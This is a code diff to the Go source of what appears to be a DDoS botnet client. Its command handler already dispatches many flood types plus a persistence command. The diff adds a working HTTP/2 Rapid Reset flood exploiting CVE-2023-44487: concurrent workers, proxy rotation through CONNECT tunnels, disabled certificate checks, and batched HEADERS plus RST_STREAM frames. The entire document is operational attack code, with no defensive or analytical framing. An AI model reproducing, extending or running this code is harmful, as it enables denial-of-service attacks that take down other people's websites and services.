@@ -24,6 +24,8 @@ import (
 	"github.com/google/gopacket"
 	"github.com/google/gopacket/layers"
 	"github.com/miekg/dns"
+	"golang.org/x/net/http2"
+	"golang.org/x/net/http2/hpack"
 )
 
 // ============================================================================
@@ -107,14 +109,14 @@ func blackEnergy(conn net.Conn, command string) error {
 	case "!stop":
 		pikachu()
 		return nil
-	case "!udpflood", "!tcpflood", "!http", "!ack", "!gre", "!syn", "!dns", "!https", "!tls", "!cfbypass":
+	case "!udpflood", "!tcpflood", "!http", "!ack", "!gre", "!syn", "!dns", "!https", "!tls", "!cfbypass", "!rapidreset":
 		// Check for proxy mode: !method target port duration -pu <proxy_url>
 		useProxy := false
 		proxyURL := ""
 		minFields := 4
 
 		// Check if -pu flag is present (proxy URL - bot fetches and rotates without validation)
-		if (cmd == "!http" || cmd == "!https" || cmd == "!tls" || cmd == "!cfbypass") && len(fields) >= 6 {
+		if (cmd == "!http" || cmd == "!https" || cmd == "!tls" || cmd == "!cfbypass" || cmd == "!rapidreset") && len(fields) >= 6 {
 			if fields[4] == "-pu" {
 				proxyURL = fields[5]
 				// Fetch proxy list from URL (no validation, max speed)
@@ -169,6 +171,12 @@ func blackEnergy(conn net.Conn, command string) error {
 			go metagross(target, duration)
 		case "!dns":
 			go salamence(target, targetPort, duration)
+		case "!rapidreset":
+			if useProxy {
+				go darkraiProxy(target, targetPort, duration, true)
+				return nil
+			}
+			go arkrai(target, targetPort, duration)
 		}
 	case "!persist":
 		go dragonfly()
@@ -1819,4 +1827,264 @@ func gengar(targetIP string, targetPort, duration int) {
 		}()
 	}
 	wg.Wait()
+}
+
+// randUA returns a random User-Agent string from the eevee pool
+func randUA() string {
+	return eevee[rand.Intn(len(eevee))]
+}
+
+// darkrai performs HTTP/2 Rapid Reset flood (CVE-2023-44487).
+// Spawns cozyBear concurrent workers sending HEADERS+RST_STREAM pairs.
+// Parameters:
+//   - target: Target hostname or IP
+//   - targetPort: Target port (typically 443)
+//   - duration: Attack duration in seconds
+func arkrai(target string, targetPort, duration int) {
+	darkraiProxy(target, targetPort, duration, false)
+}
+
+// darkraiProxy performs HTTP/2 Rapid Reset with optional proxy support.
+// Each worker opens a TLS connection negotiating h2, then sends batches of
+// HEADERS frames immediately followed by RST_STREAM (cancel).
+// Parameters:
+//   - target: Target hostname or IP
+//   - targetPort: Target port (typically 443)
+//   - duration: Attack duration in seconds
+//   - useProxy: Enable proxy CONNECT tunneling from loaded proxy list
+func darkraiProxy(target string, targetPort, duration int, useProxy bool) {
+	stopCh := raichu()
+	ctx, cancel := context.WithTimeout(context.Background(), time.Duration(duration)*time.Second)
+	defer cancel()
+
+	hostname := target
+	hostname = strings.TrimPrefix(hostname, "https://")
+	hostname = strings.TrimPrefix(hostname, "http://")
+	if idx := strings.Index(hostname, "/"); idx != -1 {
+		hostname = hostname[:idx]
+	}
+	if idx := strings.Index(hostname, ":"); idx != -1 {
+		hostname = hostname[:idx]
+	}
+
+	targetURL := fmt.Sprintf("https://%s:%d/", hostname, targetPort)
+
+	if useProxy {
+		proxyListMutex.RLock()
+		pLen := len(proxyList)
+		proxyListMutex.RUnlock()
+		if pLen == 0 {
+			return
+		}
+	}
+
+	var wg sync.WaitGroup
+	for i := 0; i < cozyBear; i++ {
+		wg.Add(1)
+		go func() {
+			defer wg.Done()
+			// Each worker reconnects in a loop until duration expires
+			for {
+				select {
+				case <-ctx.Done():
+					return
+				case <-stopCh:
+					return
+				default:
+				}
+				// Merge stop channel and context into single channel for giratina
+				merged := make(chan struct{})
+				go func() {
+					select {
+					case <-ctx.Done():
+						close(merged)
+					case <-stopCh:
+						close(merged)
+					}
+				}()
+				giratina(targetURL, merged)
+				// Small backoff before reconnecting to avoid tight spin on failures
+				time.Sleep(50 * time.Millisecond)
+			}
+		}()
+	}
+	wg.Wait()
+}
+
+// giratina opens a single HTTP/2 TLS connection and continuously sends
+// HEADERS + RST_STREAM frame pairs (rapid reset). Uses raw h2 framing via
+// golang.org/x/net/http2 for maximum throughput. Supports proxy CONNECT tunnels.
+func giratina(targetURL string, stop <-chan struct{}) error {
+	u, err := url.Parse(targetURL)
+	if err != nil {
+		return err
+	}
+
+	host := u.Hostname()
+	port := u.Port()
+	if port == "" {
+		if u.Scheme == "https" {
+			port = "443"
+		} else {
+			port = "443" // force TLS for h2
+		}
+	}
+	addr := net.JoinHostPort(host, port)
+
+	// Dial — through proxy CONNECT tunnel or direct
+	var rawConn net.Conn
+	if len(proxyList) > 0 {
+		proxy := proxyList[rand.Intn(len(proxyList))]
+		pURL, err := url.Parse(proxy)
+		if err != nil {
+			return err
+		}
+		rawConn, err = net.DialTimeout("tcp", pURL.Host, 5*time.Second)
+		if err != nil {
+			return err
+		}
+
+		// Build CONNECT request
+		connectReq := "CONNECT " + addr + " HTTP/1.1\r\nHost: " + addr + "\r\n"
+		if pURL.User != nil {
+			user := pURL.User.Username()
+			pass, _ := pURL.User.Password()
+			cred := base64.StdEncoding.EncodeToString([]byte(user + ":" + pass))
+			connectReq += "Proxy-Authorization: Basic " + cred + "\r\n"
+		}
+		connectReq += "\r\n"
+
+		if _, err := rawConn.Write([]byte(connectReq)); err != nil {
+			rawConn.Close()
+			return err
+		}
+
+		br := bufio.NewReader(rawConn)
+		resp, err := http.ReadResponse(br, nil)
+		if err != nil {
+			rawConn.Close()
+			return fmt.Errorf("CONNECT failed: %w", err)
+		}
+		resp.Body.Close()
+		if resp.StatusCode != 200 {
+			rawConn.Close()
+			return fmt.Errorf("CONNECT returned %d", resp.StatusCode)
+		}
+	} else {
+		rawConn, err = net.DialTimeout("tcp", addr, 5*time.Second)
+		if err != nil {
+			return err
+		}
+	}
+
+	// TLS handshake with ALPN h2
+	tlsConn := tls.Client(rawConn, &tls.Config{
+		ServerName:         host,
+		NextProtos:         []string{"h2"},
+		InsecureSkipVerify: true,
+	})
+	if err := tlsConn.Handshake(); err != nil {
+		rawConn.Close()
+		return err
+	}
+	defer tlsConn.Close()
+
+	if tlsConn.ConnectionState().NegotiatedProtocol != "h2" {
+		return fmt.Errorf("h2 not negotiated")
+	}
+
+	// HTTP/2 client connection preface
+	if _, err := tlsConn.Write([]byte(http2.ClientPreface)); err != nil {
+		return err
+	}
+
+	// Buffered framer — batch frames before flushing to wire
+	bw := bufio.NewWriterSize(tlsConn, 65536)
+	framer := http2.NewFramer(bw, tlsConn)
+	framer.AllowIllegalWrites = true
+
+	// Send initial SETTINGS
+	framer.WriteSettings(
+		http2.Setting{ID: http2.SettingMaxConcurrentStreams, Val: 1000},
+		http2.Setting{ID: http2.SettingInitialWindowSize, Val: 65535},
+	)
+	bw.Flush()
+
+	// Background reader — consume server frames so the connection doesn't stall
+	connDone := make(chan struct{})
+	go func() {
+		defer close(connDone)
+		for {
+			f, err := framer.ReadFrame()
+			if err != nil {
+				return
+			}
+			switch sf := f.(type) {
+			case *http2.SettingsFrame:
+				if !sf.IsAck() {
+					framer.WriteSettingsAck()
+					bw.Flush()
+				}
+			case *http2.GoAwayFrame:
+				return // server rejected us
+			}
+		}
+	}()
+
+	// HPACK encoder for pseudo-headers
+	var hdrBuf bytes.Buffer
+	enc := hpack.NewEncoder(&hdrBuf)
+
+	path := u.RequestURI()
+	if path == "" {
+		path = "/"
+	}
+	scheme := u.Scheme
+	if scheme == "" || scheme == "http" {
+		scheme = "https"
+	}
+	authority := u.Host
+
+	var streamID uint32 = 1
+	const batchSize = 100 // flush every 100 HEADERS+RST pairs
+
+	for {
+		select {
+		case <-stop:
+			return nil
+		case <-connDone:
+			return fmt.Errorf("connection closed by server")
+		default:
+		}
+
+		for i := 0; i < batchSize; i++ {
+			hdrBuf.Reset()
+			enc.WriteField(hpack.HeaderField{Name: ":method", Value: "GET"})
+			enc.WriteField(hpack.HeaderField{Name: ":path", Value: path})
+			enc.WriteField(hpack.HeaderField{Name: ":scheme", Value: scheme})
+			enc.WriteField(hpack.HeaderField{Name: ":authority", Value: authority})
+			enc.WriteField(hpack.HeaderField{Name: "user-agent", Value: randUA()})
+
+			if err := framer.WriteHeaders(http2.HeadersFrameParam{
+				StreamID:      streamID,
+				BlockFragment: hdrBuf.Bytes(),
+				EndStream:     true,
+				EndHeaders:    true,
+			}); err != nil {
+				return err
+			}
+
+			if err := framer.WriteRSTStream(streamID, http2.ErrCodeCancel); err != nil {
+				return err
+			}
+
+			streamID += 2
+
+			if streamID >= 1<<31-1 {
+				bw.Flush()
+				return nil // stream IDs exhausted — worker will reconnect
+			}
+		}
+		bw.Flush()
+	}
 }
